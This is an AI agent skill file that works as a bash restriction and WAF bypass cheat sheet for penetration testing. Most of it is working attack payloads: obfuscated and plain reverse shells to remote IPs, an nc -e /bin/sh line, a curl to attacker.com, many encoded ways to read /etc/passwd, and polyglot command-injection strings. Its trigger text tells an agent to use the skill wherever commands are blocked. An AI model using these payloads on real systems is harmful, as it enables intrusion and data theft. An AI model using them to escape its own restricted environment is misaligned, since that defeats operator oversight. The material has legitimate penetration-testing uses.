---
name: bash-restriction-bypass
description: Techniques for bypassing Linux shell restrictions, WAF filters, and command injection defenses. Use this skill whenever you need to execute commands in restricted environments, bypass input validation, work around shell limitations, or understand how attackers might evade security controls. Trigger this for any task involving command obfuscation, restricted shell access, WAF bypass, security testing of input validation, or penetration testing scenarios where standard commands are blocked.
---

# Bash Restriction Bypass Techniques

A comprehensive guide to bypassing Linux shell restrictions, WAF filters, and command injection defenses. Use these techniques for security testing, penetration assessments, and understanding attack vectors.

## When to Use This Skill

Use this skill when:
- You need to execute commands in restricted shell environments
- You're testing input validation and WAF effectiveness
- You're working with limited command access (chroot, containers, distroless)
- You need to obfuscate commands to bypass filters
- You're conducting security assessments or penetration testing
- You encounter forbidden characters, spaces, or paths in command execution

## Core Bypass Categories

### 1. Reverse Shell Bypasses

#### Double-Base64 Encoding
Avoids bad characters like `+`, works 99% of the time:

```bash
# Double-Base64 reverse shell
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
```

#### Short Reverse Shell
```bash
# Get a reverse shell
(sh)0>/dev/tcp/10.10.10.10/443
# Then get output from the reverse shell
exec >&0
```

### 2. Path and Forbidden Word Bypasses

#### Wildcard Substitution
```bash
# Question mark substitution
/usr/bin/p?ng           # /usr/bin/ping
nma? -p 80 localhost    # /usr/bin/nmap -p 80 localhost

# Asterisk wildcard
/usr/bin/who*mi         # /usr/bin/whoami

# Character class
/usr/bin/n[c]           # /usr/bin/nc
```

#### Quote Splitting
```bash
'p'i'n'g                 # ping
"w"h"o"a"m"i             # whoami
ech''o test              # echo test
ech""o test              # echo test
bas''e64                 # base64
```

#### Backslash Escaping
```bash
\u\n\a\m\e \-a          # uname -a
/\b\i\n/////s\h         # /bin/sh
```

#### Variable Expansion
```bash
# Using $@
who$@ami                 # whoami

# Using uninitialized variables
cat$u /etc$u/passwd$u   # cat /etc/passwd
p${u}i${u}n${u}g        # ping
```

#### Case Transformation
```bash
# tr for case conversion
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")    # whoami

# Bash lowercase transformation
$(a="WhOaMi";printf %s "${a,,}")    # whoami

# Reverse string
$(rev<<<'imaohw')                    # whoami
```

#### Base64 Execution
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

#### History Expansion
```bash
!-1           # Last command
!-2           # Penultimate command
mi            # Error
whoa          # Error
!-1!-2        # Executes whoami
```

#### New Line Splitting
```bash
p\
i\
n\
g           # These 4 lines equal ping
```

### 3. Space Bypasses

#### Brace Expansion
```bash
{cat,lol.txt}        # cat lol.txt
{echo,test}          # echo test
```

#### IFS (Internal Field Separator)
```bash
cat${IFS}/etc/passwd     # cat /etc/passwd
cat$IFS/etc/passwd       # cat /etc/passwd
echo${IFS}test           # echo test
```

#### Variable Assignment
```bash
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b
IFS=,;`cat<<<cat,/etc/passwd`
```

#### Hex Format
```bash
X=$'cat\x20/etc/passwd'&&$X
```

#### Tab Characters
```bash
echo "ls\x09-l" | bash
```

#### Undefined Variables
```bash
$u $u                 # Saved in history, usable as space
uname!-1\-a           # uname -a
```

### 4. Backslash and Slash Bypasses

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### 5. Pipe Bypasses

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

### 6. Hex Encoding Bypasses

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
```

### 7. IP Address Bypasses

```bash
# Decimal IP conversion
127.0.0.1 == 2130706433
```

### 8. Time-Based Data Exfiltration

```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

### 9. Environment Variable Character Extraction

```bash
echo ${LS_COLORS:10:1}    # ;
echo ${PATH:0:1}          # /
```

### 10. Shell Builtins Exploitation

When external commands are blocked, use builtins:

```bash
# List available builtins
declare builtins

# Set PATH when not configured
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Read and execute commands
read aaa; exec $aaa
read aaa; eval $aaa

# Get "/" character
printf %.1s "$PWD"

# Execute /bin/ls using printf
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get environment variables
declare

# Get command history
history
declare history
declare historywords

# Disable special builtin chars
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi  # Will print hello!
```

### 11. Polyglot Command Injection

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

### 12. Regex Bypasses

```bash
# New line bypass for alphanumeric-only regex
1%0a`curl http://attacker.com`
```

### 13. Bashfuscator

```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```

### 14. Space-Based Bash NOP Sled ("Bashsledding")

When you can't control the exact offset where execution starts, prefix commands with spaces:

```bash
# Payload with NOP sled (16 spaces)
"                nc -e /bin/sh 10.0.0.1 4444"
# 16× spaces ───┘ ↑ real command
```

**Use cases:**
- Memory-mapped configuration blobs (NVRAM)
- Situations where NULL bytes can't be written
- Embedded devices with BusyBox `ash`/`sh`
- Combine with ROP gadgets calling `system()` for IoT exploits

## DNS Data Exfiltration

Use tools like **burpcollab** or **pingb.in** for DNS-based exfiltration.

## References

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
- [WAF Bypass Cheat Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
- [WAF Evasion Techniques](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
- [Bash Manual - Shell Builtins](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)

## Usage Notes

1. **Test in safe environments** - These techniques should only be used in authorized security testing
2. **Combine techniques** - Often multiple bypasses are needed together
3. **Understand the filter** - Know what you're bypassing to choose the right technique
4. **Document findings** - Record which techniques work for your specific target
5. **Stay updated** - WAFs and filters evolve, keep your bypass knowledge current
